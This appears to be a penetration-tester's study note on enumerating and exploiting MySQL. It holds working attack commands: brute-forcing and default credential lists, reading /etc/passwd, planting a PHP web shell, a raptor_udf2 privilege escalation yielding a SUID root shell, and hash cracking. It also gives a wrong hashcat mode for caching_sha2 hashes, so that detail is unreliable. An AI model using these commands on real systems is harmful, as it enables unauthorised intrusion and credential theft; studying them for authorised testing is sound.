---
created: 2026-09-22
updated: 2026-10-09
tags:
  - services_n_protocols
---
## MySQL

>**[MySQL](https://en.wikipedia.org/wiki/MySQL)** is an open-source relational database management system (RDBMS) that uses Structured Query Language (SQL) to define, query, and manipulate data.

- MySQL is the world's most popular open-source RDBMS.
- It follows a classic **client-server model**:
	- The **server daemon (`mysqld`)** listens for incoming connections on TCP port `3306` by default. It handles authentication, parses and executes queries, and interacts with the underlying storage engine (usually [InnoDB](https://en.wikipedia.org/wiki/InnoDB)).
	- **Clients** can be CLI tools like the official [`mysql` client](https://dev.mysql.com/doc/refman/8.4/en/mysql.html) or [`mysqldump`](https://dev.mysql.com/doc/refman/8.4/en/mysqldump.html), applications, ORMs, or scripts.

> [!note] In MySQL, the terms **database** and **schema** are synonymous and used interchangeably.

>[!interesting]+ MariaDB
> - [MariaDB](https://en.wikipedia.org/wiki/MariaDB) is a community-driven fork of MySQL created after Oracle acquired Sun Microsystems.
> - Although MariaDB started as a drop-in replacement, the two systems have diverged significantly over time.

### MySQL ports

| Port    | Protocol         | Description                                                                                                                    |
| ------- | ---------------- | ------------------------------------------------------------------------------------------------------------------------------ |
| `3306`  | MySQL (classic)  | **Default `mysqld` listener** for the classic MySQL protocol used by the `mysql` client, connectors, and applications.         |
| `33060` | MySQL X Protocol | **X Protocol port** used by MySQL Shell and Document Store clients; present on MySQL 8.0+ when the `mysqlx` plugin is enabled. |

### Default system databases

MySQL ships with several built-in databases that store metadata, configuration, and system information:

- **`mysql`**
	- The core system database; stores **user accounts** and **authentication data** (including password hashes), **privileges and roles**, **server configuration**, and stored procedures/functions.
	- Access requires elevated privileges.

- **`information_schema`**
	- Read-only metadata database; contains information about:
		- Databases, tables, columns.
		- Constraints, triggers, routines.
		- Character sets and collations.
	- The database itself is accessible to **all users** without special privileges, but each user sees metadata only for those objects they have permissions to access.
	- Available from MySQL 5.0+; required by the SQL standard.

- **`performance_schema`**
	- In-memory database; tracks server performance metrics, including query execution statistics, resource usage, and instrumentation data; used for low-level performance monitoring.

- **`sys`**
	- A set of views and stored procedures built on top of `performance_schema` and `information_schema`.
	- Aggregates complex performance and status data into human-readable and user-friendly formats; useful for quick health checks and diagnostics.
	- Available from MySQL 5.7+.

### Authentication

Before being granted access to any database objects, a client must prove its identity to the server.

MySQL supports [multiple authentication methods](https://dev.mysql.com/doc/dev/mysql-server/8.4.6/page_protocol_connection_phase_authentication_methods.html), including:

- **`mysql_native_password`** (default before MySQL 8.0)
	- Stores usernames and SHA-1-hashed passwords in the `mysql.user` table.
	- SHA-1 is cryptographically broken and susceptible to rainbow table attacks.
	- Still common on older Linux servers.

- **`caching_sha2_password`** (default from MySQL 8.0+)
	- Stores passwords hashed with the SHA-256 algorithm.
	- More resistant to brute-force attacks (but still possible to crack).

- **`auth_socket`**
	- Unix socket authentication (local connections only).
	- No password required for local connections.
	- If an attacker gains shell access to the database server, they can connect as any user without a password.

- **`pam_authentication`**
	- Integrates with Linux PAM (Pluggable Authentication Modules).
	- Delegates authentication to system-level mechanisms.

>[!note] MySQL also supports LDAP, Kerberos, FIDO/WebAuthn authentication, and custom authentication plugins.


## Enumerating MySQL

### Port scanning and version detection

- Perform service version detection on the default MySQL port:

```bash
sudo nmap -sV -p 3306 10.10.11.5
```

> [!tip]+
> - Scan the full TCP range with version detection in case MySQL is bound to a non-standard port:
> 
> ```bash
> sudo nmap -sV -p- 10.10.11.5
> ```

- Run version detection together with the default NSE scripts:

```bash
sudo nmap -sV -sC -p 3306 10.10.11.5
```

- Run all available MySQL NSE scripts:

```bash
sudo nmap -sV --script "mysql-*" -p 3306 10.10.11.5
```

| Option          | Description                                                        |
| :-------------- | :---------------------------------------------------------------- |
| `-sV`           | Enable service version detection.                                 |
| `-sC`           | Run the default NSE script set.                                   |
| `-p`            | Specify destination port(s) to scan (`3306` or `-p-` for all).    |
| `--script`      | Execute a specific NSE script or glob expression.                 |
| `--script-args` | Pass arguments (such as credentials or wordlists) to the scripts. |

- Key Nmap MySQL scripts:

| Script                                                                              | Categories                  | Description                                                                             | Requires authentication? |
| ----------------------------------------------------------------------------------- | --------------------------- | --------------------------------------------------------------------------------------- | ------------------------ |
| [`mysql-empty-password`](https://nmap.org/nsedoc/scripts/mysql-empty-password.html) | `intrusive`, `auth`         | Check for empty passwords on the `root` and `anonymous` accounts.                       | ❌                        |
| [`mysql-brute`](https://nmap.org/nsedoc/scripts/mysql-brute.html)                   | `intrusive`, `brute`        | Perform a credential brute-force attack using the `userdb` and `passdb` wordlists.      | ❌                        |
| [`mysql-enum`](https://nmap.org/nsedoc/scripts/mysql-enum.html)                     | `intrusive`, `brute`        | Enumerate valid users on the MySQL server.                                              | ❌                        |
| [`mysql-databases`](https://nmap.org/nsedoc/scripts/mysql-databases.html)           | `discovery`, `intrusive`    | List all databases on the server (requires `SHOW DATABASES` privileges).                | ✅                        |
| [`mysql-dump-hashes`](https://nmap.org/nsedoc/scripts/mysql-dump-hashes.html)       | `auth`, `discovery`, `safe` | Dump password hashes in a crackable format (requires `SELECT` on `mysql.user`, `root`). | ✅                        |
| [`mysql-variables`](https://nmap.org/nsedoc/scripts/mysql-variables.html)           | `discovery`, `intrusive`    | Show all server configuration variables.                                                | ✅                        |
| [`mysql-query`](https://nmap.org/nsedoc/scripts/mysql-query.html)                   | `auth`, `discovery`, `safe` | Run an arbitrary query against the server and return the results as a table.            | ✅                        |

- Check for empty `root` and `anonymous` passwords with `mysql-empty-password` (no authentication required):

```bash
nmap -p 3306 --script mysql-empty-password 10.10.11.5
```

- Enumerate valid users with `mysql-enum` (no authentication required):

```bash
nmap -p 3306 --script mysql-enum 10.10.11.5
```

- Check for weak passwords with `mysql-brute` (no authentication required):

```bash
nmap -p 3306 --script mysql-brute 10.10.11.5
```

```bash
nmap -p 3306 --script mysql-brute --script-args userdb=users.txt,passdb=passes.txt 10.10.11.5
```

- List databases with `mysql-databases` (authentication required):

```bash
nmap -p 3306 --script mysql-databases --script-args mysqluser=root,mysqlpass=password 10.10.11.5
```

- Inspect server configuration with `mysql-variables` (authentication required):

```bash
nmap -p 3306 --script mysql-variables --script-args mysqluser=root,mysqlpass=password 10.10.11.5
```

- Dump password hashes with `mysql-dump-hashes` (authentication required, usually `root`):

```bash
nmap -p 3306 --script mysql-dump-hashes --script-args='username=root,password=password' 10.10.11.5
```

- Execute an arbitrary query with `mysql-query` (authentication required):

```bash
nmap -p 3306 --script mysql-query --script-args mysqluser=root,mysqlpass=password,query="SELECT user,host FROM mysql.user" 10.10.11.5
```

>[!tip]+
> - List local Nmap scripts for MySQL:
> 
> ```bash
> ls -l /usr/share/nmap/scripts/*mysql*
> ```

### Banner grabbing

- Grab the banner using Netcat:

```bash
nc -vn 10.10.11.5 3306
```

- Grab the banner using Telnet:

```bash
telnet 10.10.11.5 3306
```

## Brute-forcing credentials

Once the service is reachable, MySQL passwords can be brute-forced with a dictionary attack:

- Brute-force the password for a single user (`root`):

```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://10.10.11.5
```

- Brute-force credentials for multiple users:

```bash
hydra -L users.txt -P passwords.txt mysql://10.10.11.5
```

- Brute-force credentials on a non-standard port:

```bash
hydra -l root -P passwords.txt -s 3307 mysql://10.10.11.5
```

- Limit the number of parallel threads:

```bash
hydra -l root -P passwords.txt -t 4 mysql://10.10.11.5
```

| Option | Description                                                      |
| :----- | :--------------------------------------------------------------- |
| `-l`   | Set a single username to test.                                   |
| `-L`   | Read usernames from a wordlist file.                             |
| `-P`   | Read passwords from a wordlist file.                             |
| `-s`   | Set the target port (for a non-standard MySQL listener).         |
| `-t`   | Set the number of parallel threads.                              |

> [!note] MySQL has no built-in account lockout by default, but some hardened configurations or connection plugins may block repeated failures. Keep the thread count low (`-t 4`) on engagements to avoid noise.
## Connecting to MySQL

- Connect with no password:

```bash
mysql -h 10.10.11.5 -u root
```

>[!note] If you don't specify the host, `mysql` falls back to `localhost`.

- Connect with a username and password:

```bash
mysql -h 10.10.11.5 -u root -p<password>
```

>[!note] There should be no space between `-p` and the password.

- Connect with an interactive password prompt:

```bash
mysql -h 10.10.11.5 -u root -p
```

- Connect on a custom port (default is `3306`):

```bash
mysql -h 10.10.11.5 -P 3307 -u root -p<password>
```

- Connect to a specific database:

```bash
mysql -h 10.10.11.5 -u root users
```

- Connect without selecting a database:

```bash
mysql -h 10.10.11.5 -u root -p --skip-database
```

- Connect and execute a single query:

```bash
mysql -h 10.10.11.5 -u root -p -e "SELECT @@version;"
```

- Require an encrypted connection:

```bash
mysql -h 10.10.11.5 -u root -p --ssl-mode=REQUIRED
```

- Disable TLS and connect in cleartext:

```bash
mysql -h 10.10.11.5 -u root -p --skip-ssl
```

- Attempt a Unix socket connection (local only):

```bash
mysql -u root -S /var/run/mysqld/mysqld.sock
```

| Option                | Description                                                         |
| :-------------------- | :----------------------------------------------------------------- |
| `-h`                  | Connect to the specified host (defaults to `localhost`).           |
| `-u`                  | Authenticate as the specified username.                            |
| `-p`                  | Prompt for the password, or supply it inline as `-p<password>`.    |
| `-P`                  | Connect to the specified TCP port (default `3306`).                |
| `-e`                  | Execute the given SQL statement and exit.                          |
| `-S`                  | Connect through the specified Unix socket file.                    |
| `--ssl-mode=REQUIRED` | Require an encrypted TLS connection.                               |
| `--skip-ssl`          | Disable TLS and connect in cleartext.                              |
| `--skip-database`     | Connect without selecting a default database.                      |

>[!tip]+
> - Common default credentials to try (see [`SecLists/Passwords/Default-Credentials/mysql-betterdefaultpasslist.txt`](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/mysql-betterdefaultpasslist.txt)):
> 
> ```bash
> root:mysql
> root:root
> root:chippc
> admin:admin
> root:
> root:nagiosxi
> root:usbw
> cloudera:cloudera
> root:cloudera
> root:moves
> moves:moves
> root:testpw
> root:p@ck3tf3nc3
> mcUser:medocheck123
> root:mktt
> root:123
> dbuser:123
> asteriskuser:amp109
> asteriskuser:eLaStIx.asteriskuser.2oo7
> root:raspberry
> root:openauditrootuserpassword
> root:vagrant
> root:123qweASD#
> ```

>[!tip]+
> - Run an `.sql` file against a database:
> 
> ```bash
> mysql -u root -p users < /path/to/db.sql
> ```

## Enumerating the MySQL server

### Version and server information

| Command                             | Description                                                            |
| ----------------------------------- | ---------------------------------------------------------------------- |
| `SELECT VERSION();`                 | Return the server version (function form).                             |
| `SELECT @@version;`                 | Return the server version (system variable form).                      |
| `SELECT @@global.version;`          | Return the global server version variable.                             |
| `SELECT @@innodb_version;`          | Return the [InnoDB](https://en.wikipedia.org/wiki/InnoDB) storage engine version. |
| `SELECT @@version_compile_os;`      | Return the OS the server was compiled on.                              |
| `SELECT @@version_compile_machine;` | Return the CPU architecture the server was compiled for.               |
| `SHOW VARIABLES LIKE "%version%";`  | List all version-related server variables.                            |

- Query multiple variables at once:

```sql
SELECT
    @@version AS 'MySQL Version',
    @@version_comment AS 'Version Comment',
    @@version_compile_os AS 'OS',
    @@version_compile_machine AS 'Architecture',
    @@innodb_version AS 'InnoDB Version',
    @@character_set_server AS 'Character Set',
    @@collation_server AS 'Collation';
```

### Databases

| Command                                                  | Description                                          |
| -------------------------------------------------------- | ---------------------------------------------------- |
| `SHOW DATABASES;`                                        | List all databases visible to the current user.     |
| `SELECT schema_name FROM information_schema.SCHEMATA;`   | List databases through the metadata tables.          |
| `SELECT DATABASE();`                                     | Show the currently selected database.                |
| `USE users;`                                             | Switch to a specific database.                       |

- Calculate database size in MB:

```sql
SELECT
	table_schema AS 'Database',
	ROUND(SUM(data_length + index_length) / 1024 / 1024, 2) AS 'Size (MB)'
FROM information_schema.TABLES
GROUP BY table_schema;
```

- Count tables per database:

```sql
SELECT table_schema, COUNT(*) FROM information_schema.tables GROUP BY table_schema;
```

### Tables and columns

| Command                                                                                   | Description                                                           |
| ----------------------------------------------------------------------------------------- | --------------------------------------------------------------------- |
| `SHOW TABLES;`                                                                            | List tables in the current database.                                  |
| `SELECT table_name FROM information_schema.TABLES WHERE table_schema=DATABASE()`          | List tables through the `information_schema` metadata tables.         |
| `DESCRIBE table_name;`                                                                    | Show table structure and column definitions.                          |
| `SHOW COLUMNS FROM table_name;`                                                           | List columns in a table.                                              |
| `SELECT column_name, data_type FROM information_schema.COLUMNS WHERE table_name='users';` | List columns in a table through the `information_schema` metadata tables. |

- Find sensitive columns:

```sql
SELECT table_name, column_name FROM information_schema.COLUMNS
WHERE column_name LIKE '%password%'
	OR column_name LIKE '%pass%'
	OR column_name LIKE '%pwd%'
	OR column_name LIKE '%secret%'
	OR column_name LIKE '%token%'
```

- Count rows for all tables in the current database:

```sql
SELECT table_name, table_rows FROM information_schema.TABLES WHERE table_schema = DATABASE();
```

### Users

| Command                             | Description                                           |
| ----------------------------------- | ----------------------------------------------------- |
| `SELECT USER();`                    | Show the currently authenticated user (may include host). |
| `SELECT CURRENT_USER();`            | Show the current user.                                |
| `SELECT user,host FROM mysql.user;` | List MySQL accounts and their host restrictions.      |

### Privileges

| Command                                                                             | Description                                                                       |
| ----------------------------------------------------------------------------------- | --------------------------------------------------------------------------------- |
| `SHOW GRANTS;`                                                                      | Show privileges for the current user.                                             |
| `SHOW GRANTS FOR 'username'@'host';`                                                | Show privileges for a specific user.                                              |
| `SELECT * FROM information_schema.user_privileges WHERE grantee LIKE '%username%';` | Show privileges for a specific user through the `information_schema` metadata tables. |
| `SELECT grantee, privilege_type FROM information_schema.user_privileges`            | List privileges for all users through the `information_schema` metadata tables.   |
| `SELECT user, host FROM mysql.user WHERE File_priv = 'Y';`                          | List users holding the `FILE` privilege.                                          |
| `SELECT user, host FROM mysql.user WHERE Super_priv = 'Y';`                         | List users holding the `SUPER` privilege.                                         |
| `SELECT super_priv FROM mysql.user WHERE user="username"`                           | Check whether a user holds superuser privileges.                                  |

>[!note] `Y` in the response means `YES`.

- Display key privilege flags for all users:

```sql
SELECT user, host, Select_priv, Insert_priv, Update_priv, Delete_priv,
Create_priv, Drop_priv, File_priv, Super_priv
FROM mysql.user;
```

### Configuration and system variables

| Command                                         | Description                                                                                                                              |
| ----------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------- |
| `SHOW VARIABLES;`                               | List all server configuration variables.                                                                                                 |
| `SHOW VARIABLES LIKE 'secure_file_priv';`       | Show the file operations directory (where MySQL can read files with `LOAD DATA INFILE` or write files with `SELECT ... INTO OUTFILE`).   |
| `SHOW VARIABLES LIKE 'plugin_dir';`             | Show the plugin directory (where MySQL loads functions from).                                                                            |
| `SHOW VARIABLES LIKE 'datadir';`                | Show the data directory (where MySQL stores databases, tables, log files, and other critical server data).                              |
| `SHOW VARIABLES LIKE 'basedir';`                | Show the base directory (path to the MySQL installation directory).                                                                      |
| `SHOW VARIABLES LIKE 'local_infile';`           | Check whether `local_infile` is enabled (controls the ability to use `LOAD DATA LOCAL INFILE`).                                          |
| `SHOW PROCESSLIST;`                             | Display the process list (threads currently executing within the MySQL server).                                                          |
| `SELECT * FROM information_schema.PROCESSLIST;` | Display the process list through the `information_schema` metadata tables.                                                                |

## Reading and writing files

### `secure_file_priv`

>[!important] You can read or write files from MySQL only if the `secure_file_priv` variable is not `NULL`.

- Check the `secure_file_priv` variable:

```sql
SELECT @@secure_file_priv;
```

```sql
SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"
```

- Possible values:
	- `NULL`: File operations are completely disabled (most secure; default in MySQL 8.0+).
	- `''` (empty string): No restrictions — any file the MySQL process can read is accessible (insecure; default in MySQL 5.5 and earlier).
	- Specific directory path (e.g., `/var/lib/mysql-files`): Read/write allowed only within that directory.

>[!important] To perform file operations, your user must have the `FILE` privilege.

- Show privileges for the current user:

```sql
SHOW GRANTS;
```

### Reading local files

> **`LOAD_FILE()`** is a MySQL built-in string function that reads the contents of a file from the server's local filesystem and returns it as a string, or `NULL` if the file can't be read.

- Read `/etc/passwd`:

```sql
SELECT LOAD_FILE('/etc/passwd')
```

- Conditions for `LOAD_FILE()`:
	- The file must be located on the **same host where the MySQL server is running** (local files only), and the **full path** must be specified.
	- The file must be readable by the MySQL process user (or by all users).
	- The file location must satisfy the `secure_file_priv` restriction.
	- The file size must be less than `max_allowed_packet`.

>[!note]+ `max_allowed_packet`
>- Check `max_allowed_packet`:
>
>```sql
>SHOW VARIABLES LIKE '%max_allowed_packet%';
>```
>
>The file contents are returned as a string value in the query results. If the file does not exist or cannot be read because one of the preceding conditions is not satisfied, the function returns `NULL`.

- There is also [`LOAD DATA`](https://dev.mysql.com/doc/refman/8.4/en/load-data.html), which imports file contents into table rows rather than returning them directly:

```sql
-- Load /etc/passwd into a table row by row
CREATE TABLE loot (line TEXT);
LOAD DATA INFILE '/etc/passwd' INTO TABLE loot;
SELECT * FROM loot;
```

- Conditions for `LOAD DATA`:
	- The database user must have the `FILE` privilege.
	- The MySQL process user (typically `mysql`) must have read permissions on the file.
	- The file location must satisfy the `secure_file_priv` restriction.

>[!important] `LOAD_FILE()` returns file contents as a query result; `LOAD DATA` populates table rows with file contents.

> [!note] There is also a `LOAD DATA LOCAL INFILE` variant that reads from the _client's_ filesystem rather than the server's. This is controlled by the `local_infile` variable and is a separate attack surface — particularly relevant in SQL injection scenarios where you are acting as the client.

>[!tip]+
>- [`FROM_BASE64()`](https://dev.mysql.com/doc/refman/8.4/en/string-functions.html#function_from-base64) takes a Base64-encoded string and returns the decoded result as a binary string.
>- [`TO_BASE64()`](https://dev.mysql.com/doc/refman/8.4/en/string-functions.html#function_to-base64) is the reverse operation: it takes a string and returns its Base64-encoded form.

### Writing files

> **[`SELECT ... INTO OUTFILE`](https://dev.mysql.com/doc/refman/8.4/en/select-into.html)** is a MySQL statement extension that writes the result set of a `SELECT` query into a file on the server's filesystem, with fields and rows delimited by configurable separators.

> **`SELECT ... INTO DUMPFILE`** writes the raw, undelimited binary content of a single-row, single-column result set into a file — used when byte-perfect output is required, such as when writing binary payloads.

- Write a basic PHP web shell:

```sql
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
```

```sql
SELECT '<?php system($_GET["cmd"]); ?>' INTO DUMPFILE '/var/www/html/shell.php';
```

- Dump the contents of a table into a file:

```sql
SELECT * FROM users INTO OUTFILE '/tmp/file.txt'
```

>[!important] To perform file operations, your user must have the `FILE` privilege.

- Conditions for writing files:
	- The file is created on the server host.
	- The MySQL server process must have **write permissions** on the target directory.
	- The MySQL service account (typically the `mysql` user on Linux or `SYSTEM` on Windows) determines write access.
	- Files created by MySQL are owned by the MySQL process user with umask `0640`.

>[!warning] Writing files is typically restricted to privileged users.

- Common web roots to try:
	- `/var/www/html/`
	- `/var/www/html/uploads/`
	- `/var/www/`
	- `/usr/share/nginx/html/`
	- `/home/username/public_html/`

- If you were able to write a file to a web root, you might be able to reach it from the website, e.g., via `http://target/shell.php?cmd=whoami`.

## Escalating privileges through user-defined functions

### User-defined functions

>A **user-defined function (UDF)** in MySQL is a **custom function implemented in native code (C/C++)**, compiled as a **shared library** (`.so` on Linux, `.dll` on Windows), and **loaded into the MySQL server process** at runtime.

- UDFs are **not SQL functions** — they are **native code executed inside `mysqld`**.
- A UDF runs **in-process**, not as a child process.
- If a UDF crashes, MySQL crashes.

- A developer might create a UDF for custom cryptographic functions or specialized math and analytics, and use it just like any built-in MySQL function (e.g., `ABS()` or `CONCAT()`). But from an attacker's perspective, a UDF literally injects arbitrary C code into the database engine.

### Escalating privileges via UDFs

>[!important]+ MySQL versions and UDF support
> - MySQL UDFs were introduced in MySQL 4.0, and they still exist in MySQL 8.0. However, UDF exploitation is heavily restricted in 8.0+.
> - Most public UDF exploits (including raptor) assume **MySQL ≤ 5.7**.
> 
> In newer versions, the `SUPER` privilege was split, and stricter checks on plugin loading were introduced. That's why exploitation breaks in newer versions — but it doesn't mean it's impossible.

Conditions for UDF exploitation:

- **MySQL ≤ 5.7** (or an insecure 8.0 configuration). Check the MySQL version:

```sql
SELECT @@version;
```

- Your MySQL user has the **`SUPER` privilege**. Check the current user's privileges:

```sql
SHOW GRANTS;
```

```sql
SELECT super_priv FROM mysql.user WHERE user = SUBSTRING_INDEX(CURRENT_USER(),'@',1);
```

- Your user has **write access to the directory defined in the `@@plugin_dir` variable** (MySQL UDFs can be loaded only from libraries located there; commonly set to `/usr/lib/mysql/plugin` or `/usr/lib64/mysql/plugin`). Check `@@plugin_dir`:

```sql
SELECT @@plugin_dir;
```

If you have already established a foothold on the target machine, you can put a `.so` file directly into the MySQL plugin directory. Otherwise, to create the library from within the MySQL process, the `@@secure_file_priv` variable must be either empty or set to the plugin directory:

```sql
SHOW VARIABLES LIKE 'secure_file_priv';
```

If the above conditions are met, you can achieve command execution on the target server. For this purpose, you can use the popular [`raptor_udf2` exploit](https://www.exploit-db.com/exploits/1518). It provides the `do_system(command)` function that internally calls `system()` from libc and therefore turns your SQL string into an OS shell command.

>[!note] You can think of UDFs as SQL wrappers around C code, and the `raptor_udf2` exploit as an SQL wrapper around `system()`.

1. Link and compile the library:

```bash
gcc -g -c raptor_udf2.c -fPIC
```

```bash
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```

2. Create a table to store the raw binary data for the UDF:

```sql
CREATE TABLE foo(line BLOB);
```

3. Load the `.so` library from disk into the table you created:

```sql
INSERT INTO foo VALUES (LOAD_FILE('/home/user/tools/mysql-udf/raptor_udf2.so'));
```

MySQL reads the binary `.so` file from disk and stores it as raw bytes inside the table.

4. Copy the `.so` library into the plugin directory:

```sql
SELECT * FROM foo INTO DUMPFILE '/usr/lib/mysql/plugin/raptor_udf2.so';
```

5. Create the UDF:

```sql
CREATE FUNCTION do_system RETURNS INTEGER SONAME 'raptor_udf2.so';
```

This loads `raptor_udf2.so` into memory, looks for `do_system()` inside the code, and registers it as a callable SQL function.

6. List UDFs to confirm your function is registered:

```sql
SELECT * FROM mysql.func;
```

7. Execute OS commands:

```sql
SELECT do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
```

>[!note]+ UDFs execute native code with the same OS privileges as the MySQL server.
> - If MySQL runs as `mysql` → the UDF runs as `mysql`.
> - If MySQL runs as `root` (bad, but seen) → the UDF runs as `root`.

>[!tip]+
> - Clean up after UDF exploitation by dropping the function and removing the artifacts you created:
> 
> ```sql
> DROP FUNCTION do_system;
> DROP TABLE foo;
> ```
> 
> - Delete the `.so` library from the plugin directory once you no longer need it.

## Cracking password hashes

- Dump the password hashes (requires MySQL `root`):

```sql
SELECT user, host, authentication_string FROM mysql.user;
```

- `mysql_native_password` (SHA-1):

```
root:*2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19
```

```bash
hashcat -m 300 hashes.txt /usr/share/wordlists/rockyou.txt
```

- `caching_sha2_password`:

```
root:$A$005$THISISACOMPLEXSALT$... (truncated)
```

```bash
hashcat -m 3200 hashes.txt /usr/share/wordlists/rockyou.txt
```

| Option | Description                                             |
| :----- | :------------------------------------------------------ |
| `-m`   | Select the hash mode (`300` for SHA-1, `3200` for bcrypt/`caching_sha2_password`). |

>[!note] See [[Hashcat]].

## References and further reading

- [`MySQL — Wikipedia`](https://en.wikipedia.org/wiki/MySQL)
- [`MySQL Reference Manual — MySQL Documentation`](https://dev.mysql.com/doc/refman/8.4/en/)
- [`Server System Variables — MySQL Documentation`](https://dev.mysql.com/doc/refman/8.0/en/server-system-variables.html)
- [`Adding Functions to MySQL — MySQL Documentation`](https://dev.mysql.com/doc/extending-mysql/8.0/en/adding-functions.html)

- [`MySQL Injection — Payloads All The Things`](https://swisskyrepo.github.io/PayloadsAllTheThings/SQL%20Injection/MySQL%20Injection/)
- [`MySQL — Hackviser`](https://hackviser.com/tactics/pentesting/services/mysql)
- [`MySQL LOAD_FILE() function — w3resource`](https://www.w3resource.com/mysql/string-functions/mysql-load_file-function.php)
- [`LOAD_FILE() — MariaDB`](https://mariadb.com/docs/server/reference/sql-functions/string-functions/load_file)
- [`MySQL User Defined Functions — Linux Privilege Escalation — Juggernaut Pentesting Academy`](https://juggernaut-sec.com/mysql-user-defined-functions/)
- [`raptor_udf2 — Exploit-DB`](https://www.exploit-db.com/exploits/1518)

## Appendix A: Default configuration

- Read the default `mysqld` configuration, stripping comments and blank lines:

```bash
cat /etc/mysql/mysql.conf.d/mysqld.cnf | grep -v "#" | sed -r '/^\s*$/d'
```

- Many things can be misconfigured with MySQL. The [MySQL reference](https://dev.mysql.com/doc/refman/8.0/en/server-system-variables.html) documents which options can be set in the server configuration. The main security-relevant options are:

| Setting            | Description                                                                                                   |
| ------------------ | ------------------------------------------------------------------------------------------------------------- |
| `user`             | Sets which user the MySQL service runs as.                                                                    |
| `password`         | Sets the password for the MySQL user.                                                                         |
| `admin_address`    | The IP address on which to listen for TCP/IP connections on the administrative network interface.             |
| `debug`            | Indicates the current debugging settings.                                                                     |
| `sql_warnings`     | Controls whether single-row `INSERT` statements produce an information string when warnings occur.            |
| `secure_file_priv` | Limits the effect of data import and export operations.                                                       |
